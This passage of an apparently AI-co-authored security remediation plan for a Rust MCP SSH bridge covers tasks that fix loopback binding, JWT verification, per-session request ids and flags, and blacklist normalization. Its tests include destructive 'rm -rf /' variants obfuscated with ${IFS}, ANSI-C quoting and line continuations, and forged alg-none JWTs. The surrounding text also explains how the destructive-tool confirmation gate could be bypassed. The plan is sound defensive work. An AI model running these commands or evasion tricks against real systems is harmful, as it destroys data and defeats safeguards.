        .map_err(|e| crate::error::BridgeError::McpInvalidRequest(format!("HTTP serve: {e}")))
}

fn refuse_unsafe_bind(config: &HttpTransportConfig) -> crate::error::Result<()> {
    let host = config.bind.rsplit_once(':').map(|x| x.0).unwrap_or(&config.bind);
    let is_loopback = host == "127.0.0.1" || host == "::1" || host == "localhost";
    if !is_loopback && !config.oauth.enabled {
        return Err(crate::error::BridgeError::McpInvalidRequest(format!(
            "Refusing to bind '{host}' without OAuth. \
             Set oauth.enabled = true, or bind to 127.0.0.1, \
             or pass --insecure-bind to override."
        )));
    }
    Ok(())
}
```

- [ ] **Step 5: Add `--insecure-bind` CLI flag**

In `src/cli/mod.rs`, locate the `serve-http` subcommand args struct and add:

```rust
/// Allow binding to a non-loopback address with OAuth disabled. DANGEROUS.
#[arg(long, default_value_t = false)]
pub insecure_bind: bool,
```

In `src/cli/runner.rs` where `serve-http` is dispatched, threading the flag through to `serve()` (you can pass an extra `bool` parameter, or set an env-style override on `HttpTransportConfig`). Cleanest: add `pub allow_unsafe_bind: bool` to `HttpTransportConfig`, default `false`, and short-circuit `refuse_unsafe_bind` when true:

```rust
fn refuse_unsafe_bind(config: &HttpTransportConfig) -> crate::error::Result<()> {
    if config.allow_unsafe_bind { return Ok(()); }
    // ... rest as above
}
```

- [ ] **Step 6: Tighten `origin_guard` to reject missing Origin**

In `src/mcp/transport/http.rs`, replace the `origin_guard` body:

```rust
async fn origin_guard(
    State(state): State<Arc<HttpTransportState>>,
    request: Request,
    next: Next,
) -> Response {
    let origin = request.headers().get("origin").and_then(|v| v.to_str().ok());

    match origin {
        Some(o) if is_allowed_origin(o, &state.config.allowed_origins) => next.run(request).await,
        Some(o) => {
            warn!(origin = %o, "Rejected request with invalid Origin header");
            forbidden(format!("Origin '{o}' is not allowed"))
        }
        None => {
            warn!("Rejected request with no Origin header");
            forbidden("Missing Origin header (anti-DNS-rebinding)".to_string())
        }
    }
}

fn forbidden(message: String) -> Response {
    let body = serde_json::json!({
        "jsonrpc": "2.0",
        "error": { "code": -32600, "message": message },
    });
    (StatusCode::FORBIDDEN, Json(body)).into_response()
}
```

Update the existing `test_origin_guard_allows_no_origin_header` test to assert `StatusCode::FORBIDDEN` (rename it to `test_origin_guard_rejects_no_origin_header`).

- [ ] **Step 7: Run tests**

Run: `cargo test --lib --features http transport::http::tests`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add src/mcp/transport/http.rs src/config/types.rs src/cli/mod.rs src/cli/runner.rs
git commit -m "$(cat <<'EOF'
fix(security): HTTP transport defaults to loopback; refuse anonymous public bind

Vuln 1 (audit 2026-05-09). HttpTransportConfig::default() bound
0.0.0.0:3000 with OAuth disabled and an Origin guard that explicitly
forwarded requests without an Origin header — full unauthenticated
RCE for any non-browser network attacker.

Changes:
- Default bind: 127.0.0.1:3000
- serve() refuses non-loopback bind unless OAuth is enabled or
  --insecure-bind is passed
- origin_guard rejects requests with no Origin header

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 9: Verify JWT signatures with `jsonwebtoken` + JWKS (Vuln 2)

**Files:**
- Modify: `Cargo.toml`
- Modify: `src/mcp/transport/oauth.rs`
- Test: `src/mcp/transport/oauth.rs` `#[cfg(test)] mod tests`

- [ ] **Step 1: Add the dep**

```bash
cargo add jsonwebtoken@9 --features async
```

If `cargo add` is unavailable, edit `Cargo.toml` under `[dependencies]`:

```toml
jsonwebtoken = { version = "9", default-features = false, features = ["use_pem"] }
```

(Project already has `reqwest` for the JWKS fetch — confirm with `grep '^reqwest' Cargo.toml`.)

- [ ] **Step 2: Write the failing tests**

Add to `src/mcp/transport/oauth.rs` inside `mod tests`:

```rust
use jsonwebtoken::{EncodingKey, Header, Algorithm, encode};
use serde_json::json;

fn make_validator(issuer: &str, audience: &str, key_pem: &str) -> OAuthValidator {
    let cfg = OAuthConfig {
        enabled: true,
        issuer: issuer.to_string(),
        audience: audience.to_string(),
        jwks_uri: None,
        client_id: "test".to_string(),
        required_scopes: vec!["mcp:tools:execute".to_string()],
    };
    let mut v = OAuthValidator::new(cfg);
    v.set_static_keys(vec![("kid-test".to_string(), key_pem.to_string())]);
    v
}

#[test]
fn rejects_token_with_invalid_signature() {
    let priv_pem = include_str!("../../../tests/fixtures/oauth/test_priv.pem");
    let pub_pem = include_str!("../../../tests/fixtures/oauth/test_pub.pem");
    let v = make_validator("iss", "aud", pub_pem);

    let mut header = Header::new(Algorithm::RS256);
    header.kid = Some("kid-test".to_string());
    let now = chrono::Utc::now().timestamp();
    let claims = json!({
        "iss": "iss", "aud": "aud", "scope": "mcp:tools:execute",
        "exp": now + 60, "iat": now, "sub": "alice",
    });
    let valid = encode(&header, &claims, &EncodingKey::from_rsa_pem(priv_pem.as_bytes()).unwrap()).unwrap();
    // Truncate the signature to invalidate it.
    let mut parts: Vec<&str> = valid.split('.').collect();
    parts[2] = "AAAA";
    let forged = parts.join(".");
    assert!(v.validate_token(&forged).is_err());
}

#[test]
fn rejects_alg_none() {
    let pub_pem = include_str!("../../../tests/fixtures/oauth/test_pub.pem");
    let v = make_validator("iss", "aud", pub_pem);
    // header { "alg": "none", "kid": "kid-test" } base64url
    let header = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .encode(br#"{"alg":"none","kid":"kid-test"}"#);
    let payload = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .encode(br#"{"iss":"iss","aud":"aud","scope":"mcp:tools:execute","exp":99999999999}"#);
    let none_token = format!("{header}.{payload}.");
    assert!(v.validate_token(&none_token).is_err());
}

#[test]
fn rejects_expired_token() {
    let priv_pem = include_str!("../../../tests/fixtures/oauth/test_priv.pem");
    let pub_pem = include_str!("../../../tests/fixtures/oauth/test_pub.pem");
    let v = make_validator("iss", "aud", pub_pem);
    let mut header = Header::new(Algorithm::RS256);
    header.kid = Some("kid-test".to_string());
    let claims = json!({
        "iss": "iss", "aud": "aud", "scope": "mcp:tools:execute",
        "exp": 1_000_000, "iat": 999_000, "sub": "alice",
    });
    let token = encode(&header, &claims, &EncodingKey::from_rsa_pem(priv_pem.as_bytes()).unwrap()).unwrap();
    assert!(v.validate_token(&token).is_err());
}

#[test]
fn accepts_well_formed_token() {
    let priv_pem = include_str!("../../../tests/fixtures/oauth/test_priv.pem");
    let pub_pem = include_str!("../../../tests/fixtures/oauth/test_pub.pem");
    let v = make_validator("iss", "aud", pub_pem);
    let mut header = Header::new(Algorithm::RS256);
    header.kid = Some("kid-test".to_string());
    let now = chrono::Utc::now().timestamp();
    let claims = json!({
        "iss": "iss", "aud": "aud", "scope": "mcp:tools:execute",
        "exp": now + 600, "iat": now, "sub": "alice",
    });
    let token = encode(&header, &claims, &EncodingKey::from_rsa_pem(priv_pem.as_bytes()).unwrap()).unwrap();
    let claims = v.validate_token(&token).unwrap();
    assert_eq!(claims.sub, "alice");
}
```

Generate the test fixtures once:

```bash
mkdir -p tests/fixtures/oauth
openssl genpkey -algorithm RSA -out tests/fixtures/oauth/test_priv.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in tests/fixtures/oauth/test_priv.pem -out tests/fixtures/oauth/test_pub.pem
```

- [ ] **Step 3: Run failing tests**

Run: `cargo test --lib oauth::tests`
Expected: FAIL — `set_static_keys` does not exist; signature is not verified.

- [ ] **Step 4: Implement signature verification**

Replace `validate_token` in `src/mcp/transport/oauth.rs` with a version that uses `jsonwebtoken`. Replace the entire `OAuthValidator` impl:

```rust
use jsonwebtoken::{decode, decode_header, Algorithm, DecodingKey, Validation};

#[derive(Debug, serde::Deserialize)]
struct JwtClaims {
    sub: Option<String>,
    iss: String,
    aud: String,
    #[serde(default)]
    scope: String,
    exp: i64,
    #[serde(default)]
    nbf: Option<i64>,
}

pub struct OAuthValidator {
    config: OAuthConfig,
    /// Public keys in PEM, keyed by `kid`. Populated by `set_static_keys`
    /// (tests, simple deployments) or by JWKS fetch (production).
    keys: std::collections::HashMap<String, String>,
}

impl OAuthValidator {
    #[must_use]
    pub fn new(config: OAuthConfig) -> Self {
        Self { config, keys: std::collections::HashMap::new() }
    }

    pub fn set_static_keys(&mut self, keys: Vec<(String, String)>) {
        self.keys = keys.into_iter().collect();
    }

    /// Fetch JWKS from `config.jwks_uri` and replace static keys.
    pub async fn refresh_jwks(&mut self) -> Result<(), String> {
        let uri = self
            .config
            .jwks_uri
            .as_ref()
            .ok_or_else(|| "no jwks_uri configured".to_string())?;
        let resp = reqwest::get(uri).await.map_err(|e| e.to_string())?;
        let jwks: serde_json::Value = resp.json().await.map_err(|e| e.to_string())?;
        let mut keys = std::collections::HashMap::new();
        for k in jwks["keys"].as_array().ok_or("jwks.keys not array")? {
            let kid = k["kid"].as_str().unwrap_or_default().to_string();
            // Convert JWK to PEM via jsonwebtoken's DecodingKey::from_jwk
            // (we serialize back to keep the existing PEM-keyed map).
            // For RS256 only; extend if you support more algs.
            let n = k["n"].as_str().ok_or("jwk.n missing")?;
            let e = k["e"].as_str().ok_or("jwk.e missing")?;
            // We store the JWK components directly; decode-time we'll use
            // DecodingKey::from_rsa_components.
            keys.insert(kid, format!("{n}.{e}"));
        }
        self.keys = keys;
        Ok(())
    }

    pub fn validate_token(&self, token: &str) -> Result<TokenClaims, String> {
        let header = decode_header(token).map_err(|e| format!("Invalid JWT header: {e}"))?;
        if header.alg == Algorithm::HS256
            || matches!(header.alg, Algorithm::HS384 | Algorithm::HS512)
        {
            return Err("HMAC algorithms not accepted".to_string());
        }
        let kid = header.kid.ok_or_else(|| "JWT missing kid".to_string())?;
        let key_material = self
            .keys
            .get(&kid)
            .ok_or_else(|| format!("Unknown JWT signing key: {kid}"))?;

        let decoding_key = if let Some((n, e)) = key_material.split_once('.') {
            DecodingKey::from_rsa_components(n, e).map_err(|e| e.to_string())?
        } else {
            DecodingKey::from_rsa_pem(key_material.as_bytes()).map_err(|e| e.to_string())?
        };

        let mut validation = Validation::new(header.alg);
        validation.set_issuer(&[self.config.issuer.as_str()]);
        validation.set_audience(&[self.config.audience.as_str()]);
        validation.validate_exp = true;
        validation.validate_nbf = true;
        validation.leeway = 30;

        let data = decode::<JwtClaims>(token, &decoding_key, &validation)
            .map_err(|e| format!("JWT validation failed: {e}"))?;

        let scopes: Vec<String> = data
            .claims
            .scope
            .split_whitespace()
            .map(String::from)
            .collect();
        for required in &self.config.required_scopes {
            if !scopes.iter().any(|s| s == required) {
                return Err(format!("Missing required scope: {required}"));
            }
        }
        Ok(TokenClaims {
            sub: data.claims.sub.unwrap_or_default(),
            iss: data.claims.iss,
            scopes,
        })
    }
}
```

Delete the old `base64url_decode` function and the manual JSON parsing.

In `oauth_middleware`, fetch JWKS lazily on first call (or up-front in `build_router`). Simplest approach: at startup if `jwks_uri` is set, await `refresh_jwks` once and inject the populated validator. Edit `build_router_with_store` accordingly:

```rust
let mut validator = OAuthValidator::new((*oauth_config).clone());
if oauth_config.enabled && oauth_config.jwks_uri.is_some() {
    tokio::task::block_in_place(|| {
        tokio::runtime::Handle::current().block_on(validator.refresh_jwks())
    })
    .ok();
}
let validator = Arc::new(validator);
```

Pass `Arc<OAuthValidator>` via Axum extension instead of `Arc<OAuthConfig>`. Update `oauth_middleware` to read the validator and call `.validate_token` on it.

- [ ] **Step 5: Run tests**

Run: `cargo test --lib --features http oauth::tests`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add Cargo.toml Cargo.lock src/mcp/transport/oauth.rs src/mcp/transport/http.rs tests/fixtures/oauth/
git commit -m "$(cat <<'EOF'
fix(security): verify JWT signatures via jsonwebtoken + JWKS

Vuln 2 (audit 2026-05-09). Previous validator decoded the JWT payload
and read claims without verifying the signature, exp, nbf, or alg.
Replaced with jsonwebtoken-backed verification, JWKS fetch, RS256-only,
exp/nbf checks with 30s leeway, and rejection of HMAC algorithms
(prevents alg-confusion attacks).

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 10: Per-session `PendingRequests` + UUID IDs (Vuln 8)

**Files:**
- Modify: `src/mcp/pending_requests.rs:38-56` — UUID instead of `srv-{N}`
- Modify: `src/mcp/server.rs` — move `pending_requests` from server-level `Arc` to per-session
- Test: `src/mcp/pending_requests.rs` + a new `tests/multisession_isolation.rs`

- [ ] **Step 1: Write the failing UUID test**

Edit `src/mcp/pending_requests.rs::tests::test_create_request_unique_ids`:

```rust
#[test]
fn test_create_request_unique_ids() {
    let pr = PendingRequests::new();
    let (id1, _rx1) = pr.create_request();
    let (id2, _rx2) = pr.create_request();
    assert_ne!(id1, id2);
    // IDs must be unguessable, not "srv-1"/"srv-2".
    assert!(id1.starts_with("srv-"));
    assert!(id1.len() >= 32, "id should embed a UUID");
    assert_ne!(id1, "srv-1");
}
```

Add a new test:

```rust
#[test]
fn test_resolve_unknown_id_does_not_succeed() {
    let pr = PendingRequests::new();
    let _ = pr.create_request();
    // Try to resolve a guessable id; current code accepts srv-1, srv-2 …
    assert!(!pr.resolve("srv-1", ClientResponse::Success(serde_json::json!(null))));
    assert!(!pr.resolve("srv-2", ClientResponse::Success(serde_json::json!(null))));
}
```

- [ ] **Step 2: Run failing tests**

Run: `cargo test --lib pending_requests::tests`
Expected: `test_resolve_unknown_id_does_not_succeed` FAIL because the predictable id `srv-1` matches the just-created request.

- [ ] **Step 3: Switch to UUID**

In `src/mcp/pending_requests.rs`, replace `create_request`:

```rust
pub fn create_request(&self) -> (String, oneshot::Receiver<ClientResponse>) {
    let id = format!("srv-{}", uuid::Uuid::new_v4().simple());
    let (tx, rx) = oneshot::channel();
    let mut pending = self.pending.lock().expect("pending lock poisoned");
    pending.insert(id.clone(), tx);
    (id, rx)
}
```

Remove the `next_id: AtomicU64` field and its initialization.

- [ ] **Step 4: Write the multi-session isolation test**

Add `tests/multisession_isolation.rs`:

```rust
//! Verify that two sessions on the same daemon do not share pending-request state.
//! Regression test for Vuln 8 (audit 2026-05-09).

use mcp_ssh_bridge::config::Config;
use mcp_ssh_bridge::mcp::McpServer;

#[tokio::test]
async fn pending_requests_are_isolated_across_sessions() {
    let config = Config::default();
    let (server, _audit_task) = McpServer::new(config);
    let server = std::sync::Arc::new(server);

    // Open two virtual sessions and capture their PendingRequests handles.
    let pr_a = server.session_pending_requests_for_test();
    let pr_b = server.session_pending_requests_for_test();
    assert!(!std::sync::Arc::ptr_eq(&pr_a, &pr_b),
        "each session must own its own PendingRequests");

    // A creates a request; B must not be able to resolve it.
    let (id_a, _rx_a) = pr_a.create_request();
    assert!(!pr_b.resolve(&id_a,
        mcp_ssh_bridge::mcp::pending_requests::ClientResponse::Success(serde_json::json!("hijack"))
    ));
    // A's own resolver still works.
    assert!(pr_a.resolve(&id_a,
        mcp_ssh_bridge::mcp::pending_requests::ClientResponse::Success(serde_json::json!("ok"))
    ));
}
```

- [ ] **Step 5: Run failing test**

Run: `cargo test --test multisession_isolation`
Expected: FAIL — `session_pending_requests_for_test` and per-session `Arc<PendingRequests>` don't exist yet.

- [ ] **Step 6: Move PendingRequests to per-session scope**

In `src/mcp/server.rs`:

a) Delete the field `pending_requests: Arc<PendingRequests>` from `McpServer` (around line 75).

b) Stop initializing it in `McpServer::new`.

c) In `serve_session`, allocate a fresh `Arc<PendingRequests>` per session and pass it down through `handle_request_with_cancel` → `handle_tools_call` → `create_tool_context` → `ToolContext`. Add the field to `ToolContext`:

```rust
pub pending_requests: Option<Arc<PendingRequests>>,
```

Default to `None` in test factories. Production sets it from the session-local value.

d) `route_incoming_message` is invoked per session; rewrite it to look up `id` in the session-local `pending_requests` instead of the (deleted) global one.

e) Add a `#[cfg(test)] pub fn session_pending_requests_for_test(&self) -> Arc<PendingRequests>` that creates and stores a fresh map (used only by the test above).

f) Update every call site that previously did `self.pending_requests.create_request()` (search: `grep -n "pending_requests" src/mcp/`). They now need a session handle — usually plumb via `ToolContext` or function parameter.

- [ ] **Step 7: Run tests**

Run: `cargo test --test multisession_isolation`
Run: `cargo test --lib`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add src/mcp/pending_requests.rs src/mcp/server.rs src/ports/tools.rs tests/multisession_isolation.rs
git commit -m "$(cat <<'EOF'
fix(security): per-session PendingRequests with UUID ids

Vuln 8 (audit 2026-05-09). PendingRequests was a single per-server
HashMap with monotonic 'srv-{N}' ids. In multi-session daemon mode,
client B could resolve client A's pending elicitation with a guessable
id, defeating the destructive-elicitation gate. Each serve_session()
now owns its own Arc<PendingRequests>; ids are 'srv-{uuid_v4}'.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 11: Per-session `client_supports_*` flags (Vuln 9)

**Files:**
- Modify: `src/mcp/server.rs:75-95, 1017-1021, 281-351`
- Modify: `src/ports/tools.rs` — `ToolContext.client_supports_elicitation` already exists; ensure it is wired

- [ ] **Step 1: Write the failing test**

Add to `tests/multisession_isolation.rs`:

```rust
#[tokio::test]
async fn elicitation_flag_does_not_leak_across_sessions() {
    let config = Config::default();
    let (server, _audit_task) = McpServer::new(config);
    let server = std::sync::Arc::new(server);

    // Session A advertises elicitation.
    let session_a = server.create_session_for_test();
    session_a.set_client_supports_elicitation_for_test(true);

    // Session B does not.
    let session_b = server.create_session_for_test();
    assert!(!session_b.client_supports_elicitation_for_test(),
        "session B must not inherit elicitation support from session A");
}
```

(`create_session_for_test` and the `_for_test` accessors are added in Step 3.)

- [ ] **Step 2: Run failing test**

Run: `cargo test --test multisession_isolation`
Expected: FAIL — those test helpers don't exist; the field is server-global.

- [ ] **Step 3: Move flags to a per-session struct**

In `src/mcp/server.rs`:

a) Define a new type at the top of the file (before `McpServer`):

```rust
/// Per-session capabilities populated from the session's `initialize` request.
#[derive(Debug, Default)]
pub struct SessionCapabilities {
    pub supports_elicitation: AtomicBool,
    pub supports_sampling: AtomicBool,
    pub supports_roots: AtomicBool,
}
```

b) Remove the three `AtomicBool` fields from `McpServer` (`client_supports_roots`, `client_supports_elicitation`, `client_supports_sampling`).

c) In `serve_session`, allocate `let session_caps = Arc::new(SessionCapabilities::default());` and thread it through `handle_request_with_cancel` to `handle_tools_call` → `ToolContext`. Add to `ToolContext`:

```rust
pub session_caps: Option<Arc<SessionCapabilities>>,
```

d) In the `initialize` handler, set the per-session flags from the request's `capabilities` object — not the global atomics.

e) `check_destructive_elicitation` (line 281-351) — change its signature to accept `&SessionCapabilities` (or `&ToolContext`) and read from there, not from `self.client_supports_elicitation`.

f) Add the `#[cfg(test)]` helpers used by the test above.

- [ ] **Step 4: Run tests**

Run: `cargo test --test multisession_isolation`
Run: `cargo test --lib`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/mcp/server.rs src/ports/tools.rs tests/multisession_isolation.rs
git commit -m "$(cat <<'EOF'
fix(security): per-session elicitation/sampling/roots flags

Vuln 9 (audit 2026-05-09). client_supports_elicitation was a single
server-wide AtomicBool flipped to true on the first client's initialize
and never reset. In daemon multi-session mode, a malicious client that
did not advertise elicitation could still trigger destructive tools and
auto-confirm its own elicitation prompt. Moved supports_elicitation /
supports_sampling / supports_roots into a per-session SessionCapabilities
struct populated from each session's own initialize.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 12: Validator shell-aware normalization (Vuln 10)

**Files:**
- Modify: `src/security/validator.rs:120-163, 175+`
- Test: same file

- [ ] **Step 1: Write the failing tests**

Add to `src/security/validator.rs` `mod tests`:

```rust
#[test]
fn validate_blocks_ifs_substitution() {
    let cfg = SecurityConfig {
        mode: SecurityMode::Permissive,
        ..SecurityConfig::default()
    };
    let v = CommandValidator::new(&cfg);
    assert!(v.validate("rm${IFS}-rf${IFS}/").is_err(),
        "rm${{IFS}}-rf${{IFS}}/ must be blocked like 'rm -rf /'");
}

#[test]
fn validate_blocks_ansi_c_quoted_whitespace() {
    let cfg = SecurityConfig {
        mode: SecurityMode::Permissive,
        ..SecurityConfig::default()
    };
    let v = CommandValidator::new(&cfg);
    assert!(v.validate(r"rm$'\t'-rf$'\t'/").is_err());
}

#[test]
fn validate_blocks_brace_expansion_and_continuation() {
    let cfg = SecurityConfig {
        mode: SecurityMode::Permissive,
        ..SecurityConfig::default()
    };
    let v = CommandValidator::new(&cfg);
    assert!(v.validate("rm \\\n-rf /").is_err());
}

#[test]
fn validate_passes_clean_safe_command() {
    let cfg = SecurityConfig {
        mode: SecurityMode::Permissive,
        ..SecurityConfig::default()
    };
    let v = CommandValidator::new(&cfg);
    assert!(v.validate("ls -la /tmp").is_ok());
}
```

- [ ] **Step 2: Run failing tests**

Run: `cargo test --lib validator::tests::validate_blocks_ifs_substitution`
Expected: FAIL.

- [ ] **Step 3: Add a normalizer + use it before regex match**

In `src/security/validator.rs`, just above the `impl CommandValidator` block, add:

```rust
/// Normalize a command string before regex matching so that shell-side
/// expansions (`${IFS}`, `$'\t'`, brace expansion, `\<NL>`) cannot evade
/// blacklist patterns that expect a literal whitespace character.
fn normalize_for_blacklist_match(input: &str) -> String {
    // Step 1: collapse line continuations `\<NL>` to a single space.
    let mut s = input.replace("\\\n", " ");
    // Step 2: rewrite ${IFS} and $IFS to a single space.
    s = s.replace("${IFS}", " ").replace("$IFS", " ");
    // Step 3: rewrite ANSI-C quoted whitespace ($'\t', $'\n', $' ').
    s = s.replace("$'\\t'", " ").replace("$'\\n'", " ").replace("$' '", " ");
    s
}
```

In `validate()` and `validate_builtin()`, replace the line `let normalized = command.trim();` and the subsequent regex loop with:

```rust
let normalized_for_match = normalize_for_blacklist_match(command).trim().to_string();
if normalized_for_match.is_empty() {
    return Err(BridgeError::CommandDenied {
        reason: "Command cannot be empty".to_string(),
    });
}

let patterns = self.patterns.read().unwrap_or_else(std::sync::PoisonError::into_inner);

for pattern in &patterns.blacklist {
    if pattern.is_match(&normalized_for_match) {
        return Err(BridgeError::CommandDenied {
            reason: format!("Command matches blacklist pattern: {pattern}"),
        });
    }
}
```

For the whitelist check, keep using the original (un-normalized) string so legitimate whitelist patterns stay strict. The blacklist runs against the normalized form; the whitelist against the raw form.

- [ ] **Step 4: Run tests**

Run: `cargo test --lib validator::tests`
Run: `cargo test --test security_audit` (existing integration tests)
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/security/validator.rs
git commit -m "$(cat <<'EOF'
fix(security): normalize \${IFS}/\$'\\t'/line-continuation before blacklist match

Vuln 10 (audit 2026-05-09). Default blacklist regexes use \\s+ between
command words (rm\\s+-rf\\s+/), so an MCP client sending
'rm\${IFS}-rf\${IFS}/' bypassed the regex and ran 'rm -rf /' on the
remote host once shell expansion happened. validate() now collapses
\${IFS}, \$IFS, \$'\\t', \$'\\n', and '\\<NL>' to single spaces before
running the blacklist regexes; the whitelist still matches the raw
command.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Final verification

- [ ] **Run full CI locally**

```bash
make ci
```

Expected: format-check + clippy + tests + audit + typos all green.

- [ ] **Confirm Cargo.lock changes are committed alongside Cargo.toml**

If `git status` shows `Cargo.lock` modified but uncommitted, amend the relevant commit (Task 9) or add a small follow-up commit.

- [ ] **Tag a release**

```bash
# Bump 1.16.1 → 1.17.0 (security fixes warrant minor bump)
sed -i 's/^version = "1\.16\.1"/version = "1.17.0"/' Cargo.toml
cargo build --release  # refresh Cargo.lock
git add Cargo.toml Cargo.lock
git commit -m "chore(release): 1.17.0 — security audit 2026-05-09 fixes"
git tag v1.17.0
```

---

## Self-review checklist

1. **Coverage:** Vulns 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 — each has a numbered task. ✅
2. **No placeholders:** every step shows the actual code or shell command. ✅
3. **Type consistency:** `BridgeError`, `Result`, `ToolContext`, `PendingRequests`, `SessionCapabilities` are used with consistent names across tasks. ✅
4. **Test command consistency:** `cargo test --lib` for unit tests, `cargo test --test <name>` for integration, `cargo test --lib --features http` when the test is feature-gated. ✅
5. **WSL safety:** no `-j 4`+ used anywhere; no `cargo mutants` invocation. ✅
